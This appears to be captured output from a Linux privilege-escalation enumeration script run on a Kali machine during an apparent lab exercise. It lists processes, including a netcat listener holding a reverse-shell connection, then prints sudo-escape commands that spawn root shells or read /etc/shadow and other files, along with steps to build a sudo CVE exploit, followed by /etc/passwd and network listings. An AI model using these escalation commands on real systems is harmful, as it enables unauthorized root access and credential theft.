+root      157268  0.0  0.0      0     0 ?        I    04:09   0:00 [kworker/0:0-mm_percpu_wq]
+root      162719  0.0  0.0      0     0 ?        I    04:20   0:00 [kworker/u64:0-events_unbound]
+kali      163393  0.3  2.8 2781676 233364 ?      Sl   04:21   0:08 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 26 -isForBrowser -prefsLen 9562 -prefMapSize 220538 -parentBuildID 20210901125844 -appdir /usr/lib/firefox-esr/browser 122584 true tab
+root      172283  0.0  0.0      0     0 ?        I    04:39   0:01 [kworker/2:1-events]
+kali      172851  0.0  0.0   2412  1924 pts/6    S+   04:40   0:00 nc -nvlp 4444
+root      173458  0.0  0.0      0     0 ?        I    04:41   0:00 [kworker/1:2-events_freezable_power_]
+root      177968  0.0  0.0      0     0 ?        I    04:50   0:00 [kworker/u64:1-events_unbound]
+root      180934  0.0  0.0      0     0 ?        I    04:56   0:00 [kworker/0:2-events]
+root      180935  0.0  0.0      0     0 ?        I    04:56   0:00 [kworker/3:2-events]
+root      180944  0.0  0.0      0     0 ?        I    04:56   0:00 [kworker/2:2-events]
+kali      180970  0.3  1.5 2431520 123652 ?      Sl   04:56   0:01 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 27 -isForBrowser -prefsLen 9718 -prefMapSize 220538 -parentBuildID 20210901125844 -appdir /usr/lib/firefox-esr/browser 122584 true tab
+kali      181016  6.3  4.2 3053636 348960 ?      Sl   04:56   0:29 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 28 -isForBrowser -prefsLen 9718 -prefMapSize 220538 -parentBuildID 20210901125844 -appdir /usr/lib/firefox-esr/browser 122584 true tab
+root      181131  0.0  0.0      0     0 ?        I    04:56   0:00 [kworker/1:0-ata_sff]
+kali      182816  0.0  0.8 2378868 69232 ?       Sl   05:00   0:00 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 29 -isForBrowser -prefsLen 9718 -prefMapSize 220538 -parentBuildID 20210901125844 -appdir /usr/lib/firefox-esr/browser 122584 true tab
+root      182896  0.0  0.0      0     0 ?        I    05:00   0:00 [kworker/u64:2]
+root      183693  0.0  0.0      0     0 ?        I    05:02   0:00 [kworker/1:1-ata_sff]
+root      183710  0.0  0.0      0     0 ?        I    05:02   0:00 [kworker/3:0-events]
+kali      185153  0.0  0.0   5312   660 pts/8    S+   05:04   0:00 sleep 1
+kali      185154  0.0  0.0   6764  3352 pts/11   S+   05:04   0:00 /bin/bash ./privesc-linux.sh
+kali      185156  0.0  0.0  10020  3464 pts/11   R+   05:04   0:00 ps aux
+[0;91mScreen detected : /usr/bin/screen -x <screen> (ex <screen> : root/root)'[0m
+
+[0;94m###################################################[0m
+[0;94mUser                                              #[0m
+[0;94m###################################################[0m
+uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),142(kaboxer)
+
+[0;94m###################################################[0m
+[0;94mSudo perms                                        #[0m
+[0;94m###################################################[0m
+Matching Defaults entries for kali on kali:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User kali may run the following commands on kali:
+    (ALL : ALL) ALL
+-----------------------------------------------------------
+[0;91mFor awk execute command : sudo awk 'BEGIN {system("/bin/bash")}'[0m
+-----------------------------------------------------------
+[0;91mFor vim execute command : sudo vim-c ':!/bin/sh'[0m
+-----------------------------------------------------------
+[0;91mFor perl execute command : sudo perl -e 'exec "/bin/bash";'[0m
+-----------------------------------------------------------
+No python binary
+-----------------------------------------------------------
+[0;91mFor less execute command 1 : sudo less /etc/hosts[0m
+[0;91mIn /etc/hosts type : !bash[0m
+-----------------------------------------------------------
+[0;91mFor man execute command 1 : sudo man man[0m
+[0;91mType : !bash[0m
+-----------------------------------------------------------
+[0;91mFor vi execute command 1 : sudo vi[0m
+[0;91mType : !bash[0m
+-----------------------------------------------------------
+[0;91mFor apache2 execute command : sudo apache2 -f /etc/shadow[0m
+-----------------------------------------------------------
+[0;91mFor chroot execute command : sudo chroot /[0m
+-----------------------------------------------------------
+[0;91mFor find execute command : sudo find . -exec /bin/sh \; -quit[0m
+-----------------------------------------------------------
+[0;91mFor gcc execute command : sudo gcc -wrapper /bin/sh,-s .[0m
+-----------------------------------------------------------
+No ansible binary
+-----------------------------------------------------------
+[0;91mFor apt-get execute command 1 : sudo apt-get changelog apt[0m
+[0;91mFor apt-get execute command 2 : !/bin/sh[0m
+[0;91mIf last comman don't work, execute command 1 : TF=$(mktemp)[0m
+[0;91mIf last comman don't work, execute command 2 : echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF[0m
+[0;91mIf last comman don't work, execute command 3 : sudo apt-get install -c $TF sl[0m
+[0;91mOther technique, execute command : sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh[0m
+-----------------------------------------------------------
+[0;91mFor apt execute command 1 : sudo apt changelog apt[0m
+[0;91mFor apt execute command 2 : !/bin/sh[0m
+[0;91mIf last comman don't work, execute command 1 : TF=$(mktemp)
+[0;91mIf last comman don't work, execute command 2 : echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF[0m
+[0;91mIf last comman don't work, execute command 3 : sudo apt install -c $TF sl[0m
+[0;91mOther technique, execute command : sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh[0m
+-----------------------------------------------------------
+[0;91mFor ar execute command 1 : TF=$(mktemp -u)[0m
+[0;91mFor ar execute command 2 : LFILE=<file_to_read>[0m
+[0;91mFor ar execute command 3 : sudo ar r "$TF" "$LFILE"[0m
+[0;91mFor ar execute command 4 : cat "$TF"[0m
+-----------------------------------------------------------
+No aria2c binary
+-----------------------------------------------------------
+[0;91mFor arj execute command 1 : TF=$(mktemp -d)[0m
+[0;91mFor arj execute command 2 : LFILE=<file_to_write>[0m
+[0;91mFor arj execute command 3 : LDIR=<where_to_write>[0m
+[0;91mFor arj execute command 4 : echo DATA > "$TF/$LFILE"[0m
+[0;91mFor arj execute command 5 : arj a "$TF/a" "$TF/$LFILE"[0m
+[0;91mFor arj execute command 6 : sudo arj e "$TF/a" $LDIR[0m
+-----------------------------------------------------------
+[0;91mFor arp execute command 1 : LFILE=<file_to_read>[0m
+[0;91mFor arp execute command 2 : sudo arp -v -f "$LFILE"[0m
+-----------------------------------------------------------
+[0;91mFor as execute command 1 : LFILE=<file_to_read>[0m
+[0;91mFor as execute command 2 : sudo as @$LFILE[0m
+-----------------------------------------------------------
+No ash binary
+-----------------------------------------------------------
+No at binary
+-----------------------------------------------------------
+[0;91mFor atobm execute command 1 : LFILE=<file_to_read>[0m
+[0;91mFor atobm execute command 2 : sudo atobm $LFILE 2>&1 | awk -F "'" '{print "%s", $2}'[0m
+-----------------------------------------------------------
+[0;91mFor base32 execute command 1 : LFILE=<file_to_read>[0m
+[0;91mFor base32 execute command 2 : sudo base32 "$LFILE" | base32 --decode[0m
+-----------------------------------------------------------
+[0;91mFor base64 execute command 1 : LFILE=<file_to_read>[0m
+[0;91mFor base64 execute command 2 : sudo base64 "$LFILE" | base64 --decode[0m
+-----------------------------------------------------------
+[0;91mFor basenc execute command 1 : LFILE=<file_to_read>[0m
+[0;91mFor basenc execute command 2 : sudo basenc --base64  | basenc -d --base64[0m
+-----------------------------------------------------------
+No bash binary
+-----------------------------------------------------------
+
+[0;94m###################################################[0m
+[0;94mSudo version                                      #[0m
+[0;94m###################################################[0m
+Sudo version 1.9.5p2
+[0;91mCreate file with this code inside : https://github.com/saleemrashid/sudo-cve-2019-18634/blob/master/exploit.c[0m
+[0;91mCompile : gcc exploit.c -o exploit[0m
+[0;91mExecute : ./exploit[0m
+
+[0;94m###################################################[0m
+[0;94m/etc/passwd                                       #[0m
+[0;94m###################################################[0m
+root:x:0:0:root:/root:/usr/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+mysql:x:103:110:MySQL Server,,,:/nonexistent:/bin/false
+tss:x:104:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+strongswan:x:105:65534::/var/lib/strongswan:/usr/sbin/nologin
+systemd-timesync:x:106:112:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+redsocks:x:107:113::/var/run/redsocks:/usr/sbin/nologin
+rwhod:x:108:65534::/var/spool/rwho:/usr/sbin/nologin
+iodine:x:109:65534::/run/iodine:/usr/sbin/nologin
+messagebus:x:110:114::/nonexistent:/usr/sbin/nologin
+miredo:x:111:65534::/var/run/miredo:/usr/sbin/nologin
+_rpc:x:112:65534::/run/rpcbind:/usr/sbin/nologin
+usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+tcpdump:x:114:120::/nonexistent:/usr/sbin/nologin
+rtkit:x:115:121:RealtimeKit,,,:/proc:/usr/sbin/nologin
+sshd:x:116:65534::/run/sshd:/usr/sbin/nologin
+dnsmasq:x:117:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+statd:x:118:65534::/var/lib/nfs:/usr/sbin/nologin
+avahi:x:119:125:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
+stunnel4:x:120:126::/var/run/stunnel4:/usr/sbin/nologin
+Debian-snmp:x:121:127::/var/lib/snmp:/bin/false
+speech-dispatcher:x:122:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+sslh:x:123:128::/nonexistent:/usr/sbin/nologin
+postgres:x:124:129:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+nm-openvpn:x:125:130:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+nm-openconnect:x:126:131:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologin
+pulse:x:127:132:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
+saned:x:128:135::/var/lib/saned:/usr/sbin/nologin
+inetsim:x:129:137::/var/lib/inetsim:/usr/sbin/nologin
+lightdm:x:130:138:Light Display Manager:/var/lib/lightdm:/bin/false
+colord:x:131:139:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:132:140::/var/lib/geoclue:/usr/sbin/nologin
+king-phisher:x:133:141::/var/lib/king-phisher:/usr/sbin/nologin
+kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+
+[0;94m###################################################[0m
+[0;94m/etc/shadow                                       #[0m
+[0;94m###################################################[0m
+[0;91m[0m
+
+[0;94m###################################################[0m
+[0;94mBash_history                                      #[0m
+[0;94m###################################################[0m
+
+
+[0;94m###################################################[0m
+[0;94mIP                                                #[0m
+[0;94m###################################################[0m
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 00:0c:29:c5:0f:d0 brd ff:ff:ff:ff:ff:ff
+    inet 172.16.204.33/24 brd 172.16.204.255 scope global dynamic noprefixroute eth0
+       valid_lft 21856sec preferred_lft 21856sec
+    inet6 fe80::20c:29ff:fec5:fd0/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+23: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
+    link/none 
+    inet 10.8.254.74/16 scope global tun0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::bddc:35b3:b3d4:31fb/64 scope link stable-privacy 
+       valid_lft forever preferred_lft forever
+
+[0;94m###################################################[0m
+[0;94mARP discover                                      #[0m
+[0;94m###################################################[0m
+? (172.16.204.254) at 00:ff:18:a9:70:5e [ether] on eth0
+
+[0;94m###################################################[0m
+[0;94mOpen ports                                        #[0m
+[0;94m###################################################[0m
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
+tcp        0      0 172.16.204.33:55430     104.22.55.228:443       ESTABLISHED keepalive (381.98/0/0)
+tcp        0      0 172.16.204.33:50124     13.69.68.64:443         ESTABLISHED keepalive (0.28/0/0)
+tcp        0      0 172.16.204.33:52806     216.58.201.227:80       TIME_WAIT   timewait (24.89/0/0)
+tcp        0      0 172.16.204.33:41018     140.82.121.4:443        TIME_WAIT   timewait (11.24/0/0)
+tcp        0      0 172.16.204.33:42228     185.70.42.42:443        ESTABLISHED off (0.00/0/0)
+tcp        0      0 172.16.204.33:37448     142.250.178.142:443     ESTABLISHED off (0.00/0/0)
+tcp        0      0 172.16.204.33:37710     44.233.180.72:443       ESTABLISHED keepalive (299.56/0/0)
+tcp        0      0 172.16.204.33:55560     185.70.42.29:443        TIME_WAIT   timewait (9.94/0/0)
+tcp        0      0 172.16.204.33:41020     140.82.121.4:443        TIME_WAIT   timewait (13.04/0/0)
+tcp        0      0 10.8.254.74:4444        10.10.121.56:57914      ESTABLISHED off (0.00/0/0)
+udp        0      0 172.16.204.33:68        172.16.204.254:67       ESTABLISHED off (0.00/0/0)
+udp        0      0 0.0.0.0:45505           0.0.0.0:*                           off (0.00/0/0)
+raw        0      0 0.0.0.0:1               0.0.0.0:*               7           off (0.00/0/0)
+raw6       0      0 :::58                   :::*                    7           off (0.00/0/0)
+raw6       0      0 :::58                   :::*                    7           off (0.00/0/0)
+Active UNIX domain sockets (servers and established)
+Proto RefCnt Flags       Type       State         I-Node   Path
+unix  2      [ ACC ]     STREAM     LISTENING     17874    /tmp/ssh-XXXXXXBrxHnp/agent.809
+unix  2      [ ACC ]     STREAM     LISTENING     19474    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         DGRAM                    10107    /run/systemd/notify
+unix  2      [ ACC ]     STREAM     LISTENING     10110    /run/systemd/private
+unix  2      [ ACC ]     STREAM     LISTENING     10112    /run/systemd/userdb/io.systemd.DynamicUser
+unix  2      [ ACC ]     STREAM     LISTENING     10113    /run/systemd/io.system.ManagedOOM
+unix  2      [ ]         DGRAM                    10122    /run/systemd/journal/syslog
+unix  2      [ ACC ]     STREAM     LISTENING     10124    /run/systemd/fsck.progress
+unix  17     [ ]         DGRAM                    10128    /run/systemd/journal/dev-log
+unix  7      [ ]         DGRAM                    10130    /run/systemd/journal/socket
+unix  2      [ ACC ]     STREAM     LISTENING     1681     @/tmp/.X11-unix/X0
+unix  2      [ ACC ]     STREAM     LISTENING     10132    /run/systemd/journal/stdout
+unix  2      [ ACC ]     SEQPACKET  LISTENING     10134    /run/udev/control
+unix  2      [ ]         DGRAM                    1958     /run/user/1000/systemd/notify
+unix  2      [ ACC ]     STREAM     LISTENING     1961     /run/user/1000/systemd/private
+unix  2      [ ACC ]     STREAM     LISTENING     1966     /run/user/1000/bus
+unix  2      [ ACC ]     STREAM     LISTENING     1968     /run/user/1000/gnupg/S.dirmngr
+unix  2      [ ACC ]     STREAM     LISTENING     1970     /run/user/1000/gnupg/S.gpg-agent.browser
+unix  2      [ ACC ]     STREAM     LISTENING     1972     /run/user/1000/gnupg/S.gpg-agent.extra
+unix  2      [ ACC ]     STREAM     LISTENING     1974     /run/user/1000/gnupg/S.gpg-agent.ssh
+unix  2      [ ACC ]     STREAM     LISTENING     1976     /run/user/1000/gnupg/S.gpg-agent
+unix  2      [ ACC ]     STREAM     LISTENING     1978     /run/user/1000/pipewire-0
+unix  2      [ ACC ]     STREAM     LISTENING     1980     /run/user/1000/pulse/native
+unix  2      [ ACC ]     STREAM     LISTENING     1437     /run/systemd/journal/io.systemd.journal
+unix  2      [ ACC ]     STREAM     LISTENING     19481    @/tmp/.ICE-unix/809
+unix  2      [ ACC ]     STREAM     LISTENING     69795    /run/user/1000/keyring/control
+unix  2      [ ACC ]     STREAM     LISTENING     636051   /run/user/1000/vscode-f2138f4e-1.63.1-main.sock
+unix  2      [ ACC ]     STREAM     LISTENING     639034   /run/user/1000/vscode-git-f8319f6145.sock
+unix  2      [ ACC ]     STREAM     LISTENING     773000   /run/user/1000/speech-dispatcher/speechd.sock
+unix  2      [ ACC ]     STREAM     LISTENING     1682     /tmp/.X11-unix/X0
+unix  2      [ ACC ]     STREAM     LISTENING     19482    /tmp/.ICE-unix/809
+unix  3      [ ]         SEQPACKET  CONNECTED     634605   @00017
+unix  2      [ ACC ]     STREAM     LISTENING     645310   /tmp/tmux-1000/default
+unix  2      [ ACC ]     STREAM     LISTENING     14180    /run/dbus/system_bus_socket
+unix  3      [ ]         SEQPACKET  CONNECTED     634607   @00018
+unix  3      [ ]         SEQPACKET  CONNECTED     634606   
+unix  3      [ ]         STREAM     CONNECTED     19845    
+unix  3      [ ]         STREAM     CONNECTED     19844    
+unix  3      [ ]         STREAM     CONNECTED     631264   
+unix  3      [ ]         STREAM     CONNECTED     625129   
+unix  3      [ ]         STREAM     CONNECTED     621024   @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     1002875  
+unix  3      [ ]         STREAM     CONNECTED     1002848  
+unix  3      [ ]         STREAM     CONNECTED     904377   
+unix  3      [ ]         STREAM     CONNECTED     636064   
+unix  3      [ ]         STREAM     CONNECTED     19867    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     19109    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     656985   
+unix  3      [ ]         STREAM     CONNECTED     18273    
+unix  3      [ ]         STREAM     CONNECTED     18128    
+unix  3      [ ]         STREAM     CONNECTED     526780   
+unix  3      [ ]         STREAM     CONNECTED     17410    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     638007   
+unix  3      [ ]         STREAM     CONNECTED     633736   
+unix  3      [ ]         SEQPACKET  CONNECTED     621027   
+unix  3      [ ]         STREAM     CONNECTED     18980    @/tmp/.ICE-unix/809
+unix  3      [ ]         STREAM     CONNECTED     18125    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     17155    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     17978    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     19815    
+unix  3      [ ]         STREAM     CONNECTED     19694    
+unix  3      [ ]         STREAM     CONNECTED     1013968  
+unix  3      [ ]         STREAM     CONNECTED     636202   
+unix  3      [ ]         STREAM     CONNECTED     18775    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     904392   
+unix  3      [ ]         STREAM     CONNECTED     18777    
+unix  3      [ ]         STREAM     CONNECTED     790459   
+unix  3      [ ]         STREAM     CONNECTED     646161   /tmp/tmux-1000/default
+unix  3      [ ]         STREAM     CONNECTED     16336    
+unix  3      [ ]         STREAM     CONNECTED     641068   
+unix  3      [ ]         STREAM     CONNECTED     18758    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     19536    /run/user/1000/bus
+unix  2      [ ]         DGRAM                    17887    
+unix  3      [ ]         DGRAM                    10108    
+unix  3      [ ]         STREAM     CONNECTED     18782    @/tmp/.ICE-unix/809
+unix  3      [ ]         STREAM     CONNECTED     634741   
+unix  3      [ ]         STREAM     CONNECTED     19140    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     1002838  
+unix  2      [ ]         STREAM     CONNECTED     906436   
+unix  3      [ ]         STREAM     CONNECTED     636220   
+unix  3      [ ]         STREAM     CONNECTED     17397    
+unix  3      [ ]         STREAM     CONNECTED     17360    /run/user/1000/bus
+unix  3      [ ]         SEQPACKET  CONNECTED     1013973  
+unix  3      [ ]         STREAM     CONNECTED     636364   
+unix  3      [ ]         STREAM     CONNECTED     631263   
+unix  3      [ ]         STREAM     CONNECTED     631141   
+unix  3      [ ]         STREAM     CONNECTED     19129    
+unix  3      [ ]         STREAM     CONNECTED     18089    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     18756    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     18704    
+unix  2      [ ]         SEQPACKET  CONNECTED     901431   
+unix  3      [ ]         STREAM     CONNECTED     641067   
+unix  3      [ ]         STREAM     CONNECTED     622930   
+unix  3      [ ]         STREAM     CONNECTED     18164    
+unix  3      [ ]         STREAM     CONNECTED     633737   
+unix  2      [ ]         SEQPACKET  CONNECTED     630880   
+unix  2      [ ]         DGRAM                    18957    
+unix  3      [ ]         STREAM     CONNECTED     17278    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     17194    
+unix  3      [ ]         STREAM     CONNECTED     17124    
+unix  3      [ ]         STREAM     CONNECTED     17090    
+unix  3      [ ]         STREAM     CONNECTED     1685     /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     16090    /run/dbus/system_bus_socket
+unix  3      [ ]         DGRAM                    14107    
+unix  2      [ ]         DGRAM                    115229   
+unix  3      [ ]         STREAM     CONNECTED     18086    
+unix  2      [ ]         DGRAM                    332453   
+unix  3      [ ]         STREAM     CONNECTED     19811    
+unix  3      [ ]         STREAM     CONNECTED     18889    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     658445   
+unix  3      [ ]         STREAM     CONNECTED     18748    
+unix  3      [ ]         STREAM     CONNECTED     641070   
+unix  3      [ ]         STREAM     CONNECTED     19555    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     17910    
+unix  3      [ ]         STREAM     CONNECTED     2036     
+unix  3      [ ]         STREAM     CONNECTED     18655    /run/user/1000/bus
+unix  2      [ ]         DGRAM                    1904     
+unix  3      [ ]         DGRAM                    10109    
+unix  3      [ ]         STREAM     CONNECTED     16525    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     15974    
+unix  3      [ ]         STREAM     CONNECTED     1013974  
+unix  3      [ ]         STREAM     CONNECTED     636333   
+unix  3      [ ]         STREAM     CONNECTED     631251   
+unix  3      [ ]         STREAM     CONNECTED     19221    
+unix  3      [ ]         STREAM     CONNECTED     1002874  
+unix  3      [ ]         STREAM     CONNECTED     1002836  
+unix  3      [ ]         STREAM     CONNECTED     656987   
+unix  3      [ ]         STREAM     CONNECTED     633720   /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     20545    
+unix  3      [ ]         STREAM     CONNECTED     623720   
+unix  3      [ ]         STREAM     CONNECTED     19585    /run/user/1000/bus
+unix  2      [ ]         SEQPACKET  CONNECTED     623249   
+unix  3      [ ]         STREAM     CONNECTED     19130    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     18195    
+unix  3      [ ]         STREAM     CONNECTED     658704   
+unix  3      [ ]         STREAM     CONNECTED     631255   
+unix  3      [ ]         STREAM     CONNECTED     623713   
+unix  3      [ ]         STREAM     CONNECTED     904380   
+unix  3      [ ]         SEQPACKET  CONNECTED     634752   
+unix  3      [ ]         STREAM     CONNECTED     17354    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     18883    @/tmp/.ICE-unix/809
+unix  3      [ ]         STREAM     CONNECTED     1013975  
+unix  3      [ ]         STREAM     CONNECTED     636201   
+unix  3      [ ]         STREAM     CONNECTED     18088    
+unix  3      [ ]         STREAM     CONNECTED     1623     
+unix  3      [ ]         STREAM     CONNECTED     14321    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     14189    
+unix  3      [ ]         STREAM     CONNECTED     636306   
+unix  3      [ ]         STREAM     CONNECTED     633719   @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     18990    
+unix  3      [ ]         STREAM     CONNECTED     18849    
+unix  3      [ ]         STREAM     CONNECTED     17230    
+unix  3      [ ]         STREAM     CONNECTED     17027    
+unix  3      [ ]         STREAM     CONNECTED     17791    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     623206   
+unix  3      [ ]         STREAM     CONNECTED     525296   
+unix  3      [ ]         STREAM     CONNECTED     639366   
+unix  3      [ ]         STREAM     CONNECTED     525295   /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     17193    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     18786    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     18750    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     1885     
+unix  3      [ ]         STREAM     CONNECTED     904384   
+unix  3      [ ]         STREAM     CONNECTED     18713    
+unix  3      [ ]         STREAM     CONNECTED     1002840  
+unix  3      [ ]         STREAM     CONNECTED     1002834  
+unix  3      [ ]         STREAM     CONNECTED     636039   
+unix  3      [ ]         STREAM     CONNECTED     18341    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     638992   
+unix  3      [ ]         STREAM     CONNECTED     621961   
+unix  3      [ ]         STREAM     CONNECTED     18313    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     18103    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     632821   @/tmp/.X11-unix/X0
+unix  2      [ ]         STREAM     CONNECTED     629364   
+unix  3      [ ]         STREAM     CONNECTED     19880    
+unix  3      [ ]         STREAM     CONNECTED     623711   
+unix  3      [ ]         SEQPACKET  CONNECTED     623216   
+unix  3      [ ]         STREAM     CONNECTED     18215    
+unix  3      [ ]         STREAM     CONNECTED     18196    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     656975   
+unix  3      [ ]         STREAM     CONNECTED     638459   
+unix  3      [ ]         STREAM     CONNECTED     623866   
+unix  3      [ ]         STREAM     CONNECTED     18762    
+unix  2      [ ]         STREAM     CONNECTED     1003959  
+unix  3      [ ]         STREAM     CONNECTED     636040   
+unix  3      [ ]         STREAM     CONNECTED     18107    
+unix  3      [ ]         STREAM     CONNECTED     18296    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     19822    
+unix  3      [ ]         STREAM     CONNECTED     633816   
+unix  3      [ ]         STREAM     CONNECTED     633547   
+unix  3      [ ]         STREAM     CONNECTED     18991    @/tmp/.ICE-unix/809
+unix  3      [ ]         STREAM     CONNECTED     18954    
+unix  3      [ ]         STREAM     CONNECTED     18885    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     17154    
+unix  3      [ ]         STREAM     CONNECTED     17038    
+unix  3      [ ]         STREAM     CONNECTED     1662     /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     17441    
+unix  3      [ ]         STREAM     CONNECTED     1661     
+unix  3      [ ]         STREAM     CONNECTED     634441   @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     19557    
+unix  3      [ ]         STREAM     CONNECTED     19535    
+unix  3      [ ]         STREAM     CONNECTED     17827    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     17042    /run/user/1000/pipewire-0
+unix  3      [ ]         STREAM     CONNECTED     18629    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     1963     
+unix  3      [ ]         STREAM     CONNECTED     623211   
+unix  3      [ ]         STREAM     CONNECTED     18847    
+unix  3      [ ]         STREAM     CONNECTED     15990    
+unix  2      [ ]         SEQPACKET  CONNECTED     903640   
+unix  2      [ ]         DGRAM                    69792    
+unix  3      [ ]         STREAM     CONNECTED     18635    
+unix  3      [ ]         STREAM     CONNECTED     623867   
+unix  3      [ ]         STREAM     CONNECTED     18216    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     17914    
+unix  3      [ ]         STREAM     CONNECTED     18703    /run/systemd/journal/stdout
+unix  3      [ ]         DGRAM                    16788    
+unix  3      [ ]         STREAM     CONNECTED     637707   
+unix  3      [ ]         STREAM     CONNECTED     637706   
+unix  3      [ ]         STREAM     CONNECTED     17748    /run/systemd/journal/stdout
+unix  3      [ ]         SEQPACKET  CONNECTED     634608   
+unix  3      [ ]         SEQPACKET  CONNECTED     635867   
+unix  3      [ ]         STREAM     CONNECTED     18810    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     17356    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     1584     /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     1013964  
